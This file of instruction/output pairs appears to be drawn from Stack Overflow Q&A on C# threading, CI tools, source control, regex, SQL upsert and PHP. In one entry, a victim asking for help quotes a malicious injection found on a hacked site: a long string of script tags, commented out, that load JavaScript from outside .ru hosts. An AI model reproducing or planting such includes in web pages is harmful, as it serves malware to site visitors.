{"instruction": "From time to time I get a System.Threading.ThreadStateException when attempting to restart a thread. The code in question is as follows:\n// Make sure the thread is done stopping\nwhile (this.mThread.ThreadState == ThreadState.Running)\n{ \n    Thread.Sleep(0);\n}\n// Respawn a thread if the current one is stopped or doesn't exist\nif (this.mThread == null || this.mThread.ThreadState == ThreadState.Stopped)\n{ \n    this.mThread = new Thread(new ParameterizedThreadStart(Monitor)); }\n// Start the thread\nif (check)\n{ \n    this.mThread.Start(60000); \n}\nelse\n{   \n    this.mThread.Start(0); \n}\n\nSo two questions - is this the correct way of doing things, and  it is, is there a way to prevent the error from occurring?", "output": "It's possible for a thread to be in more than one state at once therefore the ThreadState property is actually a bitmap of possible states. So testing for equality with just one state will not give you the right result. You would need to do something like:\nif((mThread.ThreadState & ThreadState.Running) != 0)\n\nHowever, checking thread state is the wrong to do anything. I'm not entirely clear what you're trying to achieve but I will guess that you're waiting for a thread to terminate before restarting it. In that case you should do:\nmThread.Join();\nmThread = new Thread(new ParameterizedThreadStart(Monitor));\nif(check)\n    mThread.Start(60000);\nelse\n    mThread.Start(0);\n\nAlthough if you describe the problem you're trying to solve in more detail I'm almost certain there will be a better solution. Waiting around for a thread to end just to restart it again doesn't seem that efficient to me. Perhaps you just need some kind of inter-thread communication?\nJohn."}
{"instruction": "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\nI have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\nHe was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\nFor the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->", "output": "We had been hacked from same guys apparently! Or bots, in our case. They used SQL injection in URL on some old classic ASP sites that nobody maintain anymore. We found attacking IPs and blocked them in IIS. Now we must refactor all old ASP.\nSo, my advice is to take a look at IIS logs first, to find if problem is in your site's code or server configuration."}
{"instruction": "From time to time I get a System.Threading.ThreadStateException when attempting to restart a thread. The code in question is as follows:\n// Make sure the thread is done stopping\nwhile (this.mThread.ThreadState == ThreadState.Running)\n{ \n    Thread.Sleep(0);\n}\n// Respawn a thread if the current one is stopped or doesn't exist\nif (this.mThread == null || this.mThread.ThreadState == ThreadState.Stopped)\n{ \n    this.mThread = new Thread(new ParameterizedThreadStart(Monitor)); }\n// Start the thread\nif (check)\n{ \n    this.mThread.Start(60000); \n}\nelse\n{   \n    this.mThread.Start(0); \n}\n\nSo two questions - is this the correct way of doing things, and  it is, is there a way to prevent the error from occurring?", "output": "The problem is that you have code that first checks if it should create a new thread object, and another piece of code that determines wether to start the thread object. Due to race conditions and similar things, your code might end up trying to call .Start on an existing thread object. Considering you don't post the details behind the check variable, it's impossible to know what might trigger this behavior.\nYou should reorganize your code so that .Start is guaranteed to only be called on new objects. In short, you should put the Start method into the same if-statement as the one that creates a new thread object.\nPersonally, I would try to reorganize the entire code so that I didn't need to create another thread, but wrap the code inside the thread object inside a loop so that the thread just keeps on going."}
{"instruction": "I use cruisecontrol.rb for CI and FogBugz for bug tracking, but the more general the answers, the better.\nFirst is the technical problem: is there an API for FogBugz?  Are there good tutorials, or better yet, pre-written code?\nSecond is the procedural problem: what, exactly, should the CI put in the bug tracker when the build breaks?  Perhaps:\nTitle: \"#{last committer} broke the build!\"\nBody: \"#{ error traces }\"\nI suppose this presupposes the answer to this question: should I even put CI breaks into my bug tracking?", "output": "At my company we've recently adopted the (commercial) Atlassian stack - including JIRA for issue tracking and Bamboo for builds. Much like the Microsoft world (I'm guessing - we're a Java shop), if you get all your products from a single vendor you get the bonus of tight integration.\nFor an example of how they've done interoperability, view their interoperability page.\nEnough shilling. Generally speaking, I can summarize their general approach as:\n\nCreate issues in your bug tracker (ex: issue key of PROJ-123).\nWhen you commit code, add \"PROJ-123\" to your commit comment to indicate what bug this code change fixes.\nWhen your CI server checks out the code, scan the commit comments of the diffs. Record any strings matching the regex of your issue keys.\nWhen the build completes, generate a report of what issue keys were found.\n\nSpecifically to your second problem:\nYour CI doesn't doesn't have to put anything into your bug tracker. Bamboo doesn't put anything into JIRA. Instead, the Atlassian folks have provided a plugin to JIRA that will make a remote api call into Bamboo, asking the question \"Bamboo, to what builds am I (a JIRA issue) related?\". This is probably best explained with a screenshot."}
{"instruction": "What code analysis tools do you use on your Java projects?\nI am interested in all kinds\n\nstatic code analysis tools (FindBugs, PMD, and any others)\ncode coverage tools (Cobertura, Emma, and any others)\nany other instrumentation-based tools \nanything else, if I'm missing something\n\nIf applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \nIf a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.", "output": "All of the following we use and integrate easiy in both our Maven 2.x builds and Eclipse/RAD 7:\n\nTesting - JUnit/TestNG\nCode analysis - FindBugs, PMD\nCode coverage - Clover\n\nIn addition, in our Maven builds we have:\n\nJDepend\nTag checker (TODO, FIXME, etc)\n\nFurthermore, if you're using Maven 2.x, CodeHaus has a collection of handy Maven plugins in their Mojo project.\nNote: Clover has out-of-the-box integration with the Bamboo CI server (since they're both Atlassian products). There are also Bamboo plugins for FindBugs, PMD, and CheckStyle but, as noted, the free Hudson CI server has those too."}
{"instruction": "I use cruisecontrol.rb for CI and FogBugz for bug tracking, but the more general the answers, the better.\nFirst is the technical problem: is there an API for FogBugz?  Are there good tutorials, or better yet, pre-written code?\nSecond is the procedural problem: what, exactly, should the CI put in the bug tracker when the build breaks?  Perhaps:\nTitle: \"#{last committer} broke the build!\"\nBody: \"#{ error traces }\"\nI suppose this presupposes the answer to this question: should I even put CI breaks into my bug tracking?", "output": "All the CI setups I've worked with send an email (to a list), but if you did want\u2014especially if your team uses FogBugz much as a todo system\u2014you could just open a case in FogBugz 6. It has an API that lets you open cases. For that matter, you could just configure it to send the email to your FogBugz' email submission address, but the API might let you do more, like assign the case to the last committer.\nBrian's answer suggests to me, if your CI finds a failure in a commit that had a case number, you might even just reopen the existing case. Like codifying a case field for every little thing, though, there's a point where the CI automation could be \"too smart,\" get it wrong, and just be annoying. Opening a new case could be plenty.\nAnd thanks: this makes me wonder if I should try integrating our Chimps setup with our FogBugz!"}
{"instruction": "I'm new to development (an admin by trade) and I'm setting up my development environment and I would like to set up a CruiseControl.Net server on Server 2008.  A quick Google did not turn up any instructions for getting it running on IIS 7.0, so I was wondering if anyone had experience getting this set up.", "output": "I have never tried on Server 2008, but I have installed CruiseControl.NET on Vista which includes IIS 7.0.  I don't remember there being any problems.  You do have an admin background which should help if something does pop up.\nJust use the CruiseControl.NET wiki to get you thru the install and getting it setup.  That is all I did."}
{"instruction": "I've tried using source control for a couple projects but still don't really understand it.  For these projects, we've used TortoiseSVN and have only had one line of revisions.  (No trunk, branch, or any of that.)  If there is a recommended way to set up source control systems, what are they?  What are the reasons and benifits for setting it up that way?  What is the underlying differences between the workings of a centralized and distributed source control system?", "output": "Think of source control as a giant \"Undo\" button for your source code. Every time you check in, you're adding a point to which you can roll back. Even if you don't use branching/merging, this feature alone can be very valuable.\nAdditionally, by having one 'authoritative' version of the source control, it becomes much easier to back up.\nCentralized vs. distributed... the difference is really that in distributed, there isn't necessarily one 'authoritative' version of the source control, although in practice people usually still do have the master tree.\nThe big advantage to distributed source control is two-fold:\n\nWhen you use distributed source control, you have the whole source tree on your local machine. You can commit, create branches, and work pretty much as though you were all alone, and then when you're ready to push up your changes, you can promote them from your machine to the master copy. If you're working \"offline\" a lot, this can be a huge benefit.\nYou don't have to ask anybody's permission to become a distributor of the source control. If person A is running the project, but person B and C want to make changes, and share those changes with each other, it becomes much easier with distributed source control."}
{"instruction": "I've tried using source control for a couple projects but still don't really understand it.  For these projects, we've used TortoiseSVN and have only had one line of revisions.  (No trunk, branch, or any of that.)  If there is a recommended way to set up source control systems, what are they?  What are the reasons and benifits for setting it up that way?  What is the underlying differences between the workings of a centralized and distributed source control system?", "output": "I recommend checking out the following from Eric Sink:\nhttp://www.ericsink.com/scm/source_control.html\nHaving some sort of revision control system in place is probably the most important tool a programmer has for reviewing code changes and understanding who did what to whom. Even for single person projects, it is invaluable to be able to diff current code against previous known working version to understand what might have gone wrong due to a change."}
{"instruction": "I've tried using source control for a couple projects but still don't really understand it.  For these projects, we've used TortoiseSVN and have only had one line of revisions.  (No trunk, branch, or any of that.)  If there is a recommended way to set up source control systems, what are they?  What are the reasons and benifits for setting it up that way?  What is the underlying differences between the workings of a centralized and distributed source control system?", "output": "Even if you don't branch, you may find it useful to use tags to mark releases.\nImagine that you rolled out a new version of your software yesterday and have started making major changes for the next version. A user calls you to report a serious bug in yesterday's release. You can't just fix it and copy over the changes from your development trunk because the changes you've just made the whole thing unstable.\nIf you had tagged the release, you could check out a working copy of it and use it to fix the bug.\nThen, you might choose to create a branch at the tag and check the bug fix into it. That way, you can fix more bugs on that release while you continue to upgrade the trunk. You can also merge those fixes into the trunk so that they'll be present in the next release."}
{"instruction": "I've tried using source control for a couple projects but still don't really understand it.  For these projects, we've used TortoiseSVN and have only had one line of revisions.  (No trunk, branch, or any of that.)  If there is a recommended way to set up source control systems, what are they?  What are the reasons and benifits for setting it up that way?  What is the underlying differences between the workings of a centralized and distributed source control system?", "output": "Here are two articles that are very helpful for understanding the basics. Beyond being informative, Sink's company sells a great source control product called Vault that is free for single users (I am not affiliated in any way with that company). \nhttp://www.ericsink.com/scm/source_control.html\nhttp://betterexplained.com/articles/a-visual-guide-to-version-control/\nVault info at www.vault.com."}
{"instruction": "I've tried using source control for a couple projects but still don't really understand it.  For these projects, we've used TortoiseSVN and have only had one line of revisions.  (No trunk, branch, or any of that.)  If there is a recommended way to set up source control systems, what are they?  What are the reasons and benifits for setting it up that way?  What is the underlying differences between the workings of a centralized and distributed source control system?", "output": "The common standard for setting up Subversion is to have three folders under the root of your repository: trunk, branches and tags.  The trunk folder holds your current \"main\" line of development. For many shops and situations, this is all they ever use... just a single working repository of code.\nThe tags folder takes it one step further and allows you to \"checkpoint\" your code at certain points in time. For example, when you release a new build or sometimes even when you simply make a new build, you \"tag\" a copy into this folder. This just allows you to know exactly what your code looked like at that point in time.\nThe branches folder holds different kinds of branches that you might need in special situations. Sometimes a branch is a place to work on experimental feature or features that might take a long time to get stable (therefore you don't want to introduce them into your main line just yet). Other times, a branch might represent the \"production\" copy of your code which can be edited and deployed independently from your main line of code which contains changes intended for a future release.\nAnyway, this is just one aspect of how to set up your system, but I think giving some thought to this structure is important."}
{"instruction": "I was reading this question about how to parse URLs out of web pages and had a question about the accepted answer which offered this solution:\n((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)\n\nThe solution was offered by csmba and he credited it to regexlib.com. Whew. Credits done.\nI think this is a fairly naive regular expression but it's a fine starting point for building something better.  But, my question is this:\nWhat is the point of {1}? It means \"exactly one of the previous grouping\", right? Isn't that the default behavior of a grouping in a regular expression? Would the expression be changed in any way if the {1} were removed?\nIf I saw this from a coworker I would point out his or her error but as I write this the response is rated at a 6 and the expression on regexlib.com is rated a 4 of 5. So maybe I'm missing something?", "output": "I don't think it has any purpose. But because RegEx is almost impossible to understand/decompose, people rarely point out errors. That is probably why no one else pointed it out."}
{"instruction": "I was reading this question about how to parse URLs out of web pages and had a question about the accepted answer which offered this solution:\n((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)\n\nThe solution was offered by csmba and he credited it to regexlib.com. Whew. Credits done.\nI think this is a fairly naive regular expression but it's a fine starting point for building something better.  But, my question is this:\nWhat is the point of {1}? It means \"exactly one of the previous grouping\", right? Isn't that the default behavior of a grouping in a regular expression? Would the expression be changed in any way if the {1} were removed?\nIf I saw this from a coworker I would point out his or her error but as I write this the response is rated at a 6 and the expression on regexlib.com is rated a 4 of 5. So maybe I'm missing something?", "output": "@Rob: I disagree.  To enforce what you are asking for I think you would need to use negative-look-behind, which is possible but is certainly not related to use {1}.  Neither version of the regexp address that particular issue.\nTo let the code speak:\ntibook 0 /home/jj33/swap > cat text\nText this is <http://example.com> text this is\nText this is <http://http://example.com> text this is\ntibook 0 /home/jj33/swap > cat p\n#!/usr/bin/perl\n\nmy $re1 = '((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)';\nmy $re2 = '((mailto\\:|(news|(ht|f)tp(s?))\\://)\\S+)';\n\nwhile (<>) {\n  print \"Evaluating: $_\";\n  print \"re1 saw \\$1 = $1\\n\" if (/$re1/);\n  print \"re2 saw \\$1 = $1\\n\" if (/$re2/);\n}\ntibook 0 /home/jj33/swap > cat text | perl p\nEvaluating: Text this is <http://example.com> text this is\nre1 saw $1 = <http://example.com>\nre2 saw $1 = <http://example.com>\nEvaluating: Text this is <http://http://example.com> text this is\nre1 saw $1 = <http://http://example.com>\nre2 saw $1 = <http://http://example.com>\ntibook 0 /home/jj33/swap >\n\nSo, if there is a difference between the two versions, it's doesn't seem to be the one you suggest."}
{"instruction": "I was reading this question about how to parse URLs out of web pages and had a question about the accepted answer which offered this solution:\n((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)\n\nThe solution was offered by csmba and he credited it to regexlib.com. Whew. Credits done.\nI think this is a fairly naive regular expression but it's a fine starting point for building something better.  But, my question is this:\nWhat is the point of {1}? It means \"exactly one of the previous grouping\", right? Isn't that the default behavior of a grouping in a regular expression? Would the expression be changed in any way if the {1} were removed?\nIf I saw this from a coworker I would point out his or her error but as I write this the response is rated at a 6 and the expression on regexlib.com is rated a 4 of 5. So maybe I'm missing something?", "output": "@Jeff Atwood, your interpretation is a little off - the {1} means match exactly once, but has no effect on the \"capturing\" - the capturing occurs because of the parens - the braces only specify the number of times the pattern must match the source - once, as you say.\nI agree with @Marius, even if his answer is a little terse and may come off as being flippant. Regular expressions are tough, if one's not used to using them, and the {1} in the question isn't quite error - in systems that support it, it does mean \"exactly one match\". In this sense, it doesn't really do anything.\nUnfortunately, contrary to a now-deleted post, it doesn't keep the regexp from matching http://http://example.org, since the \\S+ at the end will match one or more non-whitespace characters, including the http://example.org in http://http://example.org (verified using Python 2.5, just in case my regexp reading was off). So, the regexp given isn't really the best. I'm not a URL expert, but probably something limiting the appearance of \":\"s and \"//\"s after the first one would be necessary (but hardly sufficient) to ensure good URLs."}
{"instruction": "I was reading this question about how to parse URLs out of web pages and had a question about the accepted answer which offered this solution:\n((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)\n\nThe solution was offered by csmba and he credited it to regexlib.com. Whew. Credits done.\nI think this is a fairly naive regular expression but it's a fine starting point for building something better.  But, my question is this:\nWhat is the point of {1}? It means \"exactly one of the previous grouping\", right? Isn't that the default behavior of a grouping in a regular expression? Would the expression be changed in any way if the {1} were removed?\nIf I saw this from a coworker I would point out his or her error but as I write this the response is rated at a 6 and the expression on regexlib.com is rated a 4 of 5. So maybe I'm missing something?", "output": "I don't think the {1} has any valid function in that regex. \n\n(mailto\\:|(news|(ht|f)tp(s?))\\://){1}\n\nYou should read this as: \"capture the stuff in the parens exactly one time\". But we don't really care about capturing this for use later, eg $1 in the replacement. So it's pointless."}
{"instruction": "I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\n\nMy logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.\nThe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.\nIs my logic sound here?\nIs this how you would combine an insert and update into a stored proc?", "output": "Your assumption is right, this is the optimal way to do it and it's called upsert/merge.\nImportance of UPSERT - from sqlservercentral.com: \n\nFor every update in the case mentioned above we are removing one\n  additional read from the table if we\n  use the UPSERT instead of EXISTS.\n  Unfortunately for an Insert, both the\n  UPSERT and IF EXISTS methods use the\n  same number of reads on the table.\n  Therefore the check for existence\n  should only be done when there is a\n  very valid reason to justify the\n  additional I/O. The optimized way to\n  do things is to make sure that you\n  have little reads as possible on the\n  DB.\nThe best strategy is to attempt the\n  update. If no rows are affected by the\n  update then insert. In most\n  circumstances, the row will already\n  exist and only one I/O will be\n  required.\n\nEdit: \nPlease check out this answer and the linked blog post to learn about the problems with this pattern and how to make it work safe."}
{"instruction": "I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\n\nMy logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.\nThe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.\nIs my logic sound here?\nIs this how you would combine an insert and update into a stored proc?", "output": "MERGE is one of the new features in SQL Server 2008, by the way."}
{"instruction": "(assume php5) consider\n<?php\n\n    $foo = 'some words';\n\n    //case 1\n    print \"these are $foo\";\n\n    //case 2\n    print \"these are {$foo}\";\n\n    //case 3\n    print 'these are ' . $foo;\n?>\n\nIs there much of a difference between 1 and 2?\nIf not, what about between 1/2 and 3?", "output": "Well, as with all \"What might be faster in real life\" questions, you can't beat a real life test.\nfunction timeFunc($function, $runs)\n{\n  $times = array();\n\n  for ($i = 0; $i < $runs; $i++)\n  {\n    $time = microtime();\n    call_user_func($function);\n    $times[$i] = microtime() - $time;\n  }\n\n  return array_sum($times) / $runs;\n}\n\nfunction Method1()\n{ \n  $foo = 'some words';\n  for ($i = 0; $i < 10000; $i++)\n    $t = \"these are $foo\";\n}\n\nfunction Method2()\n{\n  $foo = 'some words';\n  for ($i = 0; $i < 10000; $i++)\n    $t = \"these are {$foo}\";\n}\n\nfunction Method3()\n {\n  $foo = 'some words';\n  for ($i = 0; $i < 10000; $i++)\n    $t = \"these are \" . $foo;\n}\n\nprint timeFunc('Method1', 10) . \"\\n\";\nprint timeFunc('Method2', 10) . \"\\n\";\nprint timeFunc('Method3', 10) . \"\\n\";\n\nGive it a few runs to page everything in, then...\n0.0035568\n0.0035388\n0.0025394\nSo, as expected, the interpolation are virtually identical (noise level differences, probably due to the extra characters the interpolation engine needs to handle). Straight up concatenation is about 66% of the speed, which is no great shock. The interpolation parser will look, find nothing to do, then finish with a simple internal string concat. Even if the concat were expensive, the interpolator will still have to do it, after all the work to parse out the variable and trim/copy up the original string.\nUpdates By Somnath:\nI added Method4() to above real time logic.\nfunction Method4()\n {\n  $foo = 'some words';\n  for ($i = 0; $i < 10000; $i++)\n    $t = 'these are ' . $foo;\n}\n\nprint timeFunc('Method4', 10) . \"\\n\";\n\nResults were:\n\n0.0014739\n0.0015574\n0.0011955\n0.001169\n\nWhen you are just declaring a string only and no need to parse that string too, then why to confuse PHP debugger to parse. I hope you got my point."}
{"instruction": "I was using a CASE called MAGIC for a system I'm developing, I've never used this kind of tool before and at first sight I liked, a month later I had a lot of the application generated, I felt very productive and ... I would say ... satisfied.\nIn some way a felt uncomfortable, cause, there is no code and everything I was used to, but in the other hand I could speed up my developing. The fact is that eventually I returned to use C# because I find it more flexible to develop, I can make unit testing, use CVS, I have access to more resources and basically I had \"all the control\". I felt that this tool didn't give me confidence and I thought that later in the project I could not manage it due to its forced established rules of development. And also a lot of things like sending emails, using my own controls, and other things had their complication, it seemed that at some point it was not going to be as easy as initially I thought and as initially the product claims. This reminds me a very nice article called \"No Silver Bullet\".\nThis CASE had its advantages but on the other hand it doesn't have resources you can consult and actually the license and certification are very expensive. For me another dissapointing thing is that because of its simplistic approach for development I felt scared on first hand cause of my unexperience on these kind of tools and second cause I thought that if I continued using it maybe it would have turned to be a complex monster that I could not manage later in the project.\nI think its good to use these kind of solutions to speed up things but I wonder, why aren't these programs as popular as VS.Net, J2EE, Ruby, Python, etc. if they claim to enhace productivity better than the tools I've pointed?", "output": "We use a CASE tool at my current company for code generation and we are trying to move away from it.\nThe benefits that it brings - a graphical representation of the code making components 'easier' to pick up for new developers - are outweighed by the disadvantges in my opinion.\nThose main disadvantages are:\n\nWe cannot do automatic merges, making it close to impossible for parallel development on one component.\nDevelopers get dependant on the tool and 'forget' how to handcode."}
{"instruction": "I was using a CASE called MAGIC for a system I'm developing, I've never used this kind of tool before and at first sight I liked, a month later I had a lot of the application generated, I felt very productive and ... I would say ... satisfied.\nIn some way a felt uncomfortable, cause, there is no code and everything I was used to, but in the other hand I could speed up my developing. The fact is that eventually I returned to use C# because I find it more flexible to develop, I can make unit testing, use CVS, I have access to more resources and basically I had \"all the control\". I felt that this tool didn't give me confidence and I thought that later in the project I could not manage it due to its forced established rules of development. And also a lot of things like sending emails, using my own controls, and other things had their complication, it seemed that at some point it was not going to be as easy as initially I thought and as initially the product claims. This reminds me a very nice article called \"No Silver Bullet\".\nThis CASE had its advantages but on the other hand it doesn't have resources you can consult and actually the license and certification are very expensive. For me another dissapointing thing is that because of its simplistic approach for development I felt scared on first hand cause of my unexperience on these kind of tools and second cause I thought that if I continued using it maybe it would have turned to be a complex monster that I could not manage later in the project.\nI think its good to use these kind of solutions to speed up things but I wonder, why aren't these programs as popular as VS.Net, J2EE, Ruby, Python, etc. if they claim to enhace productivity better than the tools I've pointed?", "output": "Just a couple questions for you:\nHow much productivity do you gain compared to the control that you use?\nHow testable and reliant is the code you create?\nHow well can you implement a new pattern into your design?\nI can't imagine that there is a CASE out there that I could write a test first and then use a CASE to generate the code I need. I'd rather stick to resharper which can easily do my mundane tasks and retain full control of my code."}
{"instruction": "(assume php5) consider\n<?php\n\n    $foo = 'some words';\n\n    //case 1\n    print \"these are $foo\";\n\n    //case 2\n    print \"these are {$foo}\";\n\n    //case 3\n    print 'these are ' . $foo;\n?>\n\nIs there much of a difference between 1 and 2?\nIf not, what about between 1/2 and 3?", "output": "@Adam's test used\n\"these are \" . $foo\n\nnote that the following is even faster:\n'these are ' . $foo;\n\nthis is due to the fact, that a double quoted \"string\" gets evaluated, where a single quoted 'string' is just taken as is..."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "I've been toying with composite indexes and have seen some real benefits...maybe I'll setup some tests to see if that can save me here..at least for a little longer."}
{"instruction": "I'm new to development (an admin by trade) and I'm setting up my development environment and I would like to set up a CruiseControl.Net server on Server 2008.  A quick Google did not turn up any instructions for getting it running on IIS 7.0, so I was wondering if anyone had experience getting this set up.", "output": "What Dale Ragan said; it installed flawlessly on our Windows Server 2008 machine, including the Dashboard running on IIS 7. Just give it a shot; should work fine."}
{"instruction": "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?", "output": "ls (Get-ChildItem)\nrm (Remove-Item)\nps (Get-Process)\nand the rest of my familiar commands that now \"just work\" :)\nbut seriously... New-Object would have to get my vote.  With it, powershell can do ANYTHING :)"}
{"instruction": "I was using a CASE called MAGIC for a system I'm developing, I've never used this kind of tool before and at first sight I liked, a month later I had a lot of the application generated, I felt very productive and ... I would say ... satisfied.\nIn some way a felt uncomfortable, cause, there is no code and everything I was used to, but in the other hand I could speed up my developing. The fact is that eventually I returned to use C# because I find it more flexible to develop, I can make unit testing, use CVS, I have access to more resources and basically I had \"all the control\". I felt that this tool didn't give me confidence and I thought that later in the project I could not manage it due to its forced established rules of development. And also a lot of things like sending emails, using my own controls, and other things had their complication, it seemed that at some point it was not going to be as easy as initially I thought and as initially the product claims. This reminds me a very nice article called \"No Silver Bullet\".\nThis CASE had its advantages but on the other hand it doesn't have resources you can consult and actually the license and certification are very expensive. For me another dissapointing thing is that because of its simplistic approach for development I felt scared on first hand cause of my unexperience on these kind of tools and second cause I thought that if I continued using it maybe it would have turned to be a complex monster that I could not manage later in the project.\nI think its good to use these kind of solutions to speed up things but I wonder, why aren't these programs as popular as VS.Net, J2EE, Ruby, Python, etc. if they claim to enhace productivity better than the tools I've pointed?", "output": "The project I'm on originally went w/ the Oracle Development Suite to put together a web application. \nOver time (5+ years), customer requirements became more complex than originally anticipated, and the screens were not easily maintainable. So, the team informally decided to start doing custom (hand coded) screens in web PL/SQL, instead of generating them using the Oracle Development Suite CASE tools (Oracle Designer).  \nThe Oracle Report Builder component of the Development Suite is still being used by the team, as it seems to \"get the job done\" in a timely fashion. In general, the developers using the Report Builder tool are not very comfortable coding.\nIn this case, it seems that the productivity aspect of such CASE tools is heavily dependent on customer requirements and developer skill sets/training/background."}
{"instruction": "While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?\nClarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?", "output": "There should always be some developer testing. If a developer is producing too many bugs, then he/she is wasting time later on fixing those bugs. It is important that the developers don't develop the attitude which says, oh well if I leave a bug, it will be caught and I will get a chance to fix it.\nWe try to keep a threshold for bugs produced. If this threshold is crossed during testing then the developer is answerable for it. It is up to you to decide what this threshold is (for us it can vary from project to project).\nAlso, all unit testing is done by the developers."}
